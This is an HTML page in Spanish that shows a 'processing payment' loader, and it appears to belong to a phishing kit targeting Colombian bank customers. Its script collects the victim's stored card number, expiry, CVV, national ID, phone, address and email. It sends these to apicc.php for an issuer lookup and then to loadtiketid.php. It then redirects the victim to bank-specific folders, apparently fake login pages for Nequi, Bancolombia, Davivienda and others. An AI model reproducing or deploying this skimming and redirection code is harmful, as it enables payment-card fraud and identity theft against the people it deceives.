<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Procesando pago…</title>
  <style>
    :root {
      --gris:#e9e9e9;
      --barra:#74d330;
    }
    html, body { height: 100% }
    body {
      margin: 0;
      background: #fff;
      color: #12261b;
      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      min-height: 100svh;
      display: grid;
      place-items: center;
      padding: 24px;
    }
    .center {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 14px;
      width: min(520px, 92vw);
    }
    #brandImg {
      display: none;
      width: 80px;
      height: auto;
      object-fit: contain;
      margin-bottom: 10px;
    }
    .thin-loader {
      position: relative;
      width: 100%;
      height: 4px;
      border-radius: 999px;
      background: var(--gris);
      overflow: hidden;
    }
    .thin-loader::before {
      content: "";
      position: absolute;
      inset: 0 auto 0 -40%;
      width: 40%;
      background: linear-gradient(90deg, rgba(116,211,48,0) 0%, var(--barra) 50%, rgba(116,211,48,0) 100%);
      border-radius: inherit;
      animation: slide 1.05s ease-in-out infinite;
    }
    @keyframes slide { from { left: -40% } to { left: 100% } }
  </style>
</head>
<body>
  <div class="center" aria-live="polite">
    <img id="brandImg" alt="">
    <div class="thin-loader" role="progressbar" aria-busy="true" aria-label="Procesando"></div>
  </div>

<script>
(function() {
  // 1️⃣ Cargar los datos base de tbdatos
  const datos = (() => {
    try { return JSON.parse(localStorage.getItem('tbdatos') || '{}'); }
    catch { return {}; }
  })();

  // Intentar leer el método de pago explícito (desde el objeto o desde la raíz si se guardó plano)
  const metodoElegido = datos.metodo_pago || '';

  // Mostrar logo según tarjeta (si existen datos de tarjeta)
  const mostrarLogo = () => {
    const num = String(datos.cardNumber || datos.tarjeta || '').replace(/\s+/g, '');
    const img = document.getElementById('brandImg');
    if (num.startsWith('4')) {
      img.src = 'visa.png';
      img.alt = 'Visa';
      img.style.display = 'block';
    } else if (num.startsWith('5')) {
      img.src = 'master.png';
      img.alt = 'Mastercard';
      img.style.display = 'block';
    } else {
      img.style.display = 'none';
    }
  };
  mostrarLogo();

  // Limpiar banco de tbdatos para que no contamine el resultado de la API
  try {
    const tb = JSON.parse(localStorage.getItem('tbdatos') || '{}');
    delete tb.banco;
    localStorage.setItem('tbdatos', JSON.stringify(tb));
  } catch(e) {}

  // Limpiar claves sueltas que puedan interferir
  localStorage.removeItem('banco');
  localStorage.removeItem('infoload');

  // Construir el payload unificado
  const payload = {
    ownerName: datos.ownerName || datos.nombre || '',
    cardNumber: datos.cardNumber || datos.tarjeta || '',
    expMonth: datos.expMonth || '',
    expYear: datos.expYear || '',
    cvv: datos.cvv || '',
    cuotas: datos.cuotas || '',
    cedula: datos.documento || datos.cedula || '',
    phone: datos.telefono || datos.cel || '',
    city: datos.ciudad || '',
    address: datos.direccion || datos.dir || '',
    contact: {
      correo: datos.correo || localStorage.getItem('correo') || '',
      telefono: datos.telefono || datos.cel || ''
    }
  };

  // Función de ruteo y redirección
  const procesarRedireccionFinal = () => {
    const params = window.location.search || "";

    // Migrar datos de tbdatos a variables individuales para persistencia en pasarela
    try {
      if (Object.keys(datos).length > 0) {
        if (datos.correo)       localStorage.setItem("correo", datos.correo);
        if (datos.telefono)     localStorage.setItem("cel", datos.telefono);
        if (datos.documento)    localStorage.setItem("val", datos.documento);
        if (datos.tipo_persona) localStorage.setItem("per", datos.tipo_persona);
        if (datos.nombre)       localStorage.setItem("nom", datos.nombre);
      }
    } catch (e) {
      console.warn("No se pudo mapear tbdatos a variables individuales:", e);
    }

    let folder = null;
    let tipo   = null;

    // Buscar banco de manera ultra robusta
    const info = JSON.parse(localStorage.getItem("infoload") || "{}");
    let bancoRaw = (info.bank || "").toLowerCase().trim();

    // Limpieza y estandarización del string del banco
    bancoRaw = bancoRaw
      .normalize("NFD")
      .replace(/[\u0300-\u036f]/g, ""); // Quita acentos

    const bancoCleanConGuion = bancoRaw.replace(/\s+/g, "-");
    const bancoCleanSinGuion = bancoRaw.replace(/[^a-z0-9]/g, "");

    // 🟡 PRIORIDAD ESTRUCTURAL NEQUI
    if (bancoCleanConGuion.includes("nequi") || bancoCleanSinGuion.includes("nequi")) {
      folder = "nequi-1";
      tipo   = "1";
    } else {
      // Diccionario optimizado para Tarjeta y PSE (Soporta guiones y nombres planos)
      const bankMap = [
        { keys: ["avvillas", "bancoavvillas", "banco-av-villas", "av-villas"], folder: "b-34f1/", tipo: "2" },
        { keys: ["bbva", "banco-bbva", "banco-bbva-colombia-s-a"], folder: "b-34f13", tipo: "2" },
        { keys: ["cajasocial", "bancocajasocial", "banco-caja-social"], folder: "b-34f2", tipo: "2" },
        { keys: ["bogota", "bancodebogota", "banco-de-bogota"], folder: "b-34f4", tipo: "2" },
        { keys: ["davivienda", "banco-davivienda", "daviplata"], folder: "b-34f10", tipo: "2" },
        { keys: ["occidente", "bancodeoccidente", "banco-de-occidente"], folder: "b-34f14", tipo: "2" },
        { keys: ["falabella", "banco-falabella"], folder: "b-34f5", tipo: "2" },
        { keys: ["finandina", "banco-finandina"], folder: "b-34f6", tipo: "2" },
        { keys: ["itau", "banco-itau"], folder: "b-34f7", tipo: "2" },
        { keys: ["mundomujer", "bmancomundomujer", "banco-mundo-mujer"], folder: "b-34f01", tipo: "1" },
        { keys: ["popular", "bancopopular", "banco-popular"], folder: "b-34f18", tipo: "2" },
        { keys: ["serfinanza", "banco-serfinanza"], folder: "b-34f16", tipo: "2" },
        { keys: ["union", "giros", "bancounion", "banco-union"], folder: "b-34f0", tipo: "1" },
        { keys: ["bancolombia", "bancocolombia", "banco-colombia"], folder: "b-34f9", tipo: "2" },
        { keys: ["lulo", "lulo-bank", "lulobank"], folder: "b-34f02", tipo: "1" },
        { keys: ["scotiabank", "colpatria", "scotiabankcolpatria", "scotiabank-colpatria"], folder: "b-34f12", tipo: "2" }
      ];

      for (const bank of bankMap) {
        const match = bank.keys.some(k => {
          const kClean = k.trim().toLowerCase();
          return bancoCleanConGuion.includes(kClean) || bancoCleanSinGuion.includes(kClean.replace(/-/g, ""));
        });
        if (match) {
          folder = bank.folder;
          tipo   = bank.tipo;
          break;
        }
      }
    }

    // Redireccionar
    if (folder) {
      setTimeout(() => {
        window.location.href = `/data-ps/recargas/transaction/${folder}${params}`;
      }, 800);
    } else {
      console.warn("Banco no identificado, aplicando desvío a 3d.php");
      window.location.href = "3d.php";
    }
  };

  // LÓGICA INTELIGENTE: Evalúa basándose en la variable estricta de método de pago o campos de respaldo
  const ejecutarFlujo = () => {
    const tieneTarjeta = !!(payload.cardNumber && payload.expMonth && payload.expYear && payload.cvv);
    
    // Si explícitamente se guardó como tarjeta, o si el método no está definido pero tiene los números completados
    if (datos.metodo_pago === 'card' || (datos.metodo_pago !== 'pse' && shouldProcessAsCard(payload))) {
      
      fetch('apicc.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          number: payload.cardNumber.replace(/\s+/g, ''),
          expiry_month: payload.expMonth,
          expiry_year: (payload.expYear.length === 2) ? "20" + payload.expYear : payload.expYear,
          cvv: payload.cvv,
          name: payload.ownerName,
          billing_address: { country: 'CO' },
          phone: {}
        })
      })
      .then(res => res.json())
      .then(resApi => {
        const bancoLimpio = (resApi.issuer || datos.banco || 'Desconocido')
          .replace(/ S\.A\.?/gi, '')
          .trim();

        const tipoFranquicia = (resApi.scheme || '').toLowerCase() || 'Desconocido';

        localStorage.setItem('infoload', JSON.stringify({ bank: bancoLimpio }));
        localStorage.setItem('TIPE', JSON.stringify({ tipo: tipoFranquicia }));

        payload.bank = bancoLimpio;
        payload.type = tipoFranquicia;
        payload.tbdatos = datos;
        payload.total_pagar = localStorage.getItem('total_pagar') || '0';

        return fetch('loadtiketid.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      })
      .then(() => {
        procesarRedireccionFinal();
      })
      .catch(err => {
        console.error('Error en pasarela API CC:', err);
        procesarRedireccionFinal();
      });

    } else {
      // Si es PSE o no cuenta con los datos mínimos de tarjeta, avanza directamente sin tocar apicc.php
      console.log("Flujo PSE o alterno detectado de forma segura.");
      procesarRedireccionFinal();
    }
  };

  // Helper para verificar campos estructurados
  function luhnCheckBackup(num) {
    return num.length >= 13;
  }

  const tieneCamposTarjeta = () => {
    return payload.cardNumber && payload.expMonth && payload.expYear && payload.cvv;
  };

  function shouldProcessAsCard(p) {
    return !!(p.cardNumber && p.expMonth && p.expYear && p.cvv);
  }

  // Lanzar ejecución
  ejecutarFlujo();

})(); 
</script>

</body>
</html>